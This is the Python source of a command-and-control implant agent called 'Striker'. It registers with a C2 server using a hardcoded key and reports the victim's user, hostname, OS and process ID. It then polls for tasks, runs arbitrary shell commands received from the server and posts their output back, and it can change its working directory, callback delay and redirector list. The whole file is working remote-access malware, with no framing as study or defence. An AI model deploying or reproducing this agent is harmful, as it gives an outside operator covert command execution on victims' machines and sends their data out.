#!/usr/bin/python3

import sys
import os
import subprocess
import shlex
import json
import time
sleep = time.sleep
import threading
import requests

c2URL = "http://localhost:3000"
authKey = "345c8856fc611d5e3074385404550268"
delay = 5
MAX_FAILED_CONNS = 5

class Striker:

  def __init__(self, servers, authKey, delay):
    self.abort = False
    self.servers = servers
    self.authKey = authKey
    self.delay = int(delay)
    self.baseUrl = ""
    self.uid = ""
    self.config = {}
    self.tasks = {}
    self.os = os.name
    self.user = os.getenv("USER")
    self.hostname = "unknown"
    if (os.name in ["posix"]):
      self.os = "linux"
      try:
        self.hostname = open("/etc/hostname").read().strip()
      except:
        pass
    elif (os.name in ["nt"]):
      self.os = "windows"
    self.writeDir = os.getcwd()
    if self.os == "linux":
      self.writeDir = "/etc/"
    elif self.os == "windows":
      self.writeDir = "C:\\users\\Public\\"
    else:
      if self.writeDir[-1] != "/":
        self.writeDir += "/"

  def httpGet(self, url):
    try:
      res = requests.get(url)
      return (res.status_code, res.text)
    except Exception as e:
      print("[-] Error making GET request to %s: %s" %(url, str(e)))
      return (0, str(e))

  def httpPost(self, url, body):
    try:
      res = requests.post(url, json=body)
      return (res.status_code, res.text)
    except Exception as e:
      print("[-] Error making POST request to %s: %s" %(url, str(e)))
      return (0, str(e))

  def info(self):
    return {
      "user": self.user,
      "pid": os.getpid(),
      "cwd": os.getcwd(),
      "os": self.os,
      "host": self.hostname
    }

  def execTask(self, task):
    taskID = task['uid']
    data = {}
    try:
      data = task['data']
    except KeyError:
      pass
    result = "Not implemented!"
    if (task["taskType"] == "system"):
      cmd = data['cmd']
      try:
        proc = subprocess.Popen(shlex.split(cmd), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        result = (proc.stderr.read() + proc.stdout.read()).decode()
      except Exception as e:
        result = "Error running shell command: " + str(e)
    elif (task["taskType"] == "abort"):
      self.abort = True
      result = "Session aborted!"
    elif (task["taskType"] == "writedir"):
      self.writeDir = data["dir"]
      if self.os == "windows" and self.writeDir[-1] != "\\":
        self.writeDir += "\\"
      elif self.writeDir[-1] != "/":
        self.writeDir += "/"
      result = "Write directory updated: " + self.writeDir
    elif (task["taskType"] == "delay"):
      self.delay = int(data["delay"])
      result = "Updated callback delay to %d secs" %(self.delay)
    elif (task["taskType"] == "cd"):
      try:
        os.chdir(data["dir"])
        result = "Changed working directory: " + os.getcwd()
      except FileNotFoundError as e:
        result = "Erro changing working directory: " + str(e)
    task["result"] = {"uid":taskID, "result":result}
    task["finished"] = True

  def connectToBase(self):
    connected = False
    status = 0
    body = "{}"
    print("[*] Connecting to C2 server...");
    data = self.info()
    data["key"] = self.authKey
    freshConn = True
    while not connected:
      for url in self.servers:
        status = 0
        body = ""
        if self.uid:
          status, body = self.httpGet(url + "/agent/ping/" + self.uid)
          freshConn = False
        else:
          status, body = self.httpPost(url + "/agent/init", data)
        if (status != 200):
          sleep(self.delay)
          continue
        self.baseUrl = url
        connected = True
        break
    print("[+] Connected to: %s" %(self.baseUrl))
    if not freshConn:
      return True
    self.config = json.loads(body)
    print(self.config)
    self.uid = self.config["uid"]
    for url in self.config["redirectors"]:
      if not url in self.servers: self.servers.append(url)
    return True

  def start(self):
    self.connectToBase();
    failedConns = 0
    while True:
      if failedConns >= MAX_FAILED_CONNS:
        self.connectToBase()
        failedConns = 0
        continue
      eTime = time.time() + self.delay
      while time.time() < eTime:
        sleep(1)
        taskResults = []
        for taskID in self.tasks:
          if (self.tasks[taskID]["finished"]):
            taskResults.append(self.tasks[taskID]["result"])
        if len(taskResults) > 0:
          print("[*] Sending %d results..." %(len(taskResults)))
          status, body = self.httpPost(self.baseUrl + "/agent/tasks/" + self.uid, taskResults)
          if (status != 200):
            continue
          failedConns = 0
          for result in taskResults:
            del self.tasks[result["uid"]]
      if self.abort:
        break
      status, body = self.httpGet(self.baseUrl + "/agent/tasks/" + self.uid)
      if status != 200:
        failedConns += 1
        continue
      newTasks = json.loads(body)
      if len(newTasks) == 0:
        continue
      print("[+] %d new tasks received!" %(len(newTasks)))
      for task in newTasks:
        task["finished"] = False
        self.tasks[task["uid"]] = task
        t = threading.Thread(target=self.execTask, args=(task,))
        t.start()
    return

if __name__ == '__main__':
  striker = Striker([c2URL], authKey, delay)
  try:
    striker.start()
  except KeyboardInterrupt:
    sys.exit(0)
